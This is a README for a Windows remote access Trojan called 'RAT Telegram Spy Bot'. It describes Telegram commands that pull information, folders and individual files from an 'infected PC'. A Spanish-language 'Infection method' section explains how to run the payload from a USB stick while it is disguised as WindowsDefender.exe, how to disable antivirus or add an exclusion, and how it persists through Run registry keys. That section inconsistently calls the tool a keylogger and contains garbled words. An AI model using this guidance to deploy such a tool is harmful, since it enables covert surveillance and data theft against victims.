# [Clic aquí para leer la documentación en español](Doc/Readme.md)
````logo
█▀▀█  █▀▀█ ▀▀█▀▀ 　 
█▄▄▀  █▄▄█   █   　 
█  █  █  █   █   　 

▀▀█▀▀ █▀▀ █   █▀▀ █▀▀▀ █▀▀█ █▀▀█ █▀▄▀█  █▀▀▀█ █▀▀█ █  █  █▀▀█ █▀▀█ ▀▀█▀▀ 
  █   █▀▀ █   █▀▀ █ ▀█ █▄▄▀ █▄▄█ █ ▀ █  ▀▀▀▄▄ █  █ █▄▄█  █▀▀▄ █  █   █ 
  █   ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀▀ ▀ ▀▀ ▀  ▀ ▀   ▀  █▄▄▄█ █▀▀▀ ▄▄▄█  █▄▄█ ▀▀▀▀   ▀
````
# ¡Por favor! úserla solo para fines educativos y con profesionalidad...
## Information
* __Developed by:__ `SebastianEPH`
* __Product name:__ `RAT Telegram Spy Bot`
* __Type software:__ `Remote Administration Tool`
* __File version:__ `0.1.0`
* __Architecture:__ `x86 bits || x64 bits`
* __State:__ `Beta`
* __Size:__ `400KB aprox`
* __Undetectable:__ `Not Tester`
* __Plataform:__ `Windows 7, 8.1, 10`
* __Programming language:__ `C#.net Framework - Console`
* __Licence:__ `MIT`
* __IDE or text editor:__ `Visual Studio Comunity 2019`
* __Documentation date:__ `30/05/2020`
* __Description:__ `Remote access Trojan, spies and obtains information from the infected pc, controlled by telegram commands. `
# Main Folder

# Features

## `Commands and examples:`

<img src="https://i.imgur.com/59EsirM.png"
     alt="Commands List" title="Commands List">

### `/Status`
Show a message only if the infected PC is online

<img src="https://i.imgur.com/NYBXToL.png"
     alt="Command /Status " title="Command /Status - Example">

### `/Show_Information`
Shows detailed information of the infected PC

<img src="https://i.imgur.com/BTubIpL.png"
     alt="Command Show_Information " title="Command Show_Information - Example">


### `/Get_FilesAll`
It shows default system folders where there can be: [Images] [Photos] [Documents] [Music] and gets them, the process can take many minutes

In case you can't find the folder, show a message a controlled exception

<img src="https://i.imgur.com/5G271Hi.png"
     alt="Command /Status " title="Command /Status - Example">


### `/Get_OnlyFile <Path>`
- Write the command plus the file path with extension.
- The accepted file extensions are as follows, the file must not exceed 50MB
     ````csharp
     string[] video = { "gif", "mp4", "avi", "div", "m4v", "mov", "mpg", "mpeg", "qt", "wmv", "webm", "flv", "3gp" };
     string[] audio = { "midi", "mp1", "mp2", "mp3", "wma", "ogg", "au", "m4a" };
     string[] doc = { "doc", "docx", "txt", "log", "ppt", "pptx", "pdf" };
     string[] imagen = { "jpg", "jpeg", "png", "bmp", "ico", "jpe", "jpe" };
     string[] system = { "ani", "bat", "bfc", "bkf", "blg", "cat", "cer", "cfg", "chm", "chk", "clp", "cmd", "cnf", "com", "cpl", "crl", "crt", "cur", "dat", "db", "der", "dll", "drv", "ds", "dsn" , "dun","exe","fnd","fng","fon","grp","hlp","ht","inf","ini","ins","isp","job","key","lnk","msi","msp","msstyles", "nfo","ocx","otf","p7c","pfm","pif","pko","pma","pmc","pml","pmr","pmw","pnf","psw","qds","rdp","reg","scf","scr","sct","shb","shs","sys","theme", "tmp","ttc","ttf","udl","vxd","wab","wmdb","wme","wsc","wsf","wsh","zap"};
     ````
__NOTE:__ `Do not enclose path in double or single quotes`

![/Get_OnlyFile](https://i.imgur.com/4zT3BAb.png)

![sad](https://i.imgur.com/7RnOe6p.png)
### `/Dir <Path>`
List of files in the folder and subfolders of the selected path

__Example:__ __`/Dir`__  `C:\User\Photos and videos`

![/Dir](https://i.imgur.com/6drHgrW.png)

### `/`
### `/`
### `/`
### `/`
### `/About`
_Show creator info._

<img src="https://i.imgur.com/cyhbQzj.png"
     alt="Command /About "
     width="355"
     height="700"
     title="Command /About">

# Compilation

# Infection method
___¿Cómo infecto a la victima?___

![Final files](https://i.imgur.com/TlBEAaS.png)


__Nota:__ No cambiar de nombre al archivo `WindowsDefender.exe`, si usted le cambia el nombre, el Keylogger quedará obsoleto.
- Usten guardará el archivo en un USB.
- Conectará el __USB__ a la __[PC]__ a infectar.
- Se recomienda desactivar el antivirus o agregar una exclusión en al siguiente ruta: `"C:\Users\Public\Security\Windows Defender"`.
- Lo siguiente es ejecutar el archivo `WindowsDefender.exe` en el USB, el Keylogger se replicará en la siguiente ruta `"C:\Users\Public\Security\Windows Defender"`, Se recomienda no sacar el USB al instante ya que el `Keylogger` se estará replicando en la ruta.

__NOTA:__ Al ejecutar el archivó, ésta automaticamente modificará el registro de windows para que se inicie siempre al prender la computadora.

El Keylogger tKeyloggerará de modificar la siguiente ruta del registro `"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"` por lo cual necesitará permisos de administrador, por ende se recomienda que la primera ejecución se realice con permisos de administrador, en caso de que no lo ejecute con permisos de administrador, el Keylogger modificará la siguiente ruta `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"`

__Explicación:__ 
* `HKEY_LOCAL_MACHINE:` El Keylogger se ejecutará en todos los usuarios exitentes y los nuevos usuarios de la computadora
* `HKEY_CURRENT_USER:` El Keylogger solo se ejecutará en el usuario actual, si se llegará a crear otro usuario, el Keylogger Solo funcionará en el usuario principal
<!-- Creador  -->
---
## Contact:
__Nota:__ Contacteme solo si encontró un bug o desea aportar al repositorio, gracias.

__Developed:__ by SebastianEPH
- [Website](https://sebastianeph.github.io/)
- [Github](https://github.com/SebastianEPH)
- [Linkedin](https://www.linkedin.com/in/sebastianeph/)
- [Telegram](https://t.me/sebastianeph)
